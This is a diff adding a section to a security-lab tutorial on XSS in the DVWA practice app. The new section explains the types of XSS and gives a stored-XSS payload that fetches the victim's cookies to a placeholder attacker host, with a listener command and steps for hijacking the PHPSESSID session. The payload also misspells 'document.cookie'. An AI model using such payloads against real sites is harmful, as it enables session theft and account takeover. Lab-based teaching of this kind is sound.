@@ -195,3 +195,35 @@ To get all **password hashes** we input:
 ```
 
 Crack them with ```john``` or ```hashcat```.
+
+### Other common vulnerabilites to know and how to exploit them
+
+Important thing to consider: there is data and code(data operations). Most of the vulnerabilities are based upon how data can affect code. So basically, *User input is data*, that allows us to modify how our web app behaves based on what we *type in.* A good example is **XSS.** 
+
+**XSS** - Cross-Site Scripting is a common vulnerability which allows us to inject malicious code into a web app. There are couple of types of XSS. 
+
+- **Reflected XSS** - payload comes from the URL or a form, gets echoed back into the page once. Attacker sends a victim a malicious link.
+- **Stored XSS** - — payload gets saved on the server (in a comment, profile, forum post) and runs for every user who views that page. Way more dangerous — it scales.
+- **DOM-based XSS** — the unsafe handling happens entirely in client-side JavaScript, no server involvement. 
+
+In the DVWA web app go to sections ```XSS reflected``` or ```XSS stored```. Input something like:
+
+```javascript 
+<script>alert('XSS attack')</script>
+```
+
+Now revisit page, you should get an alert. 
+
+More sophisticated attack would involve getting User's session cookies and Authentication with them. For that go to ```XSS stored```, type in ```Message``` field and click ```Sign Guestbook```: 
+
+```javascript
+<script>fetch('http://attacker-ip:8000/?c='+document.cookies)</script>
+```
+
+In Kali terminal start listening: 
+
+```shell
+python3 -m http.server -b <attacker-ip> 8000
+```
+
+Now revisit the ```XSS stored``` page, you should get cookies in Kali's terminal, that's your key to authentication. From now just logout and inject this cookie value as ```PHPSESSID``` in DevTools, navigate to Auth Required page(something like http://target-ip/dvwa/), you should be able to see it without entering credentials. 
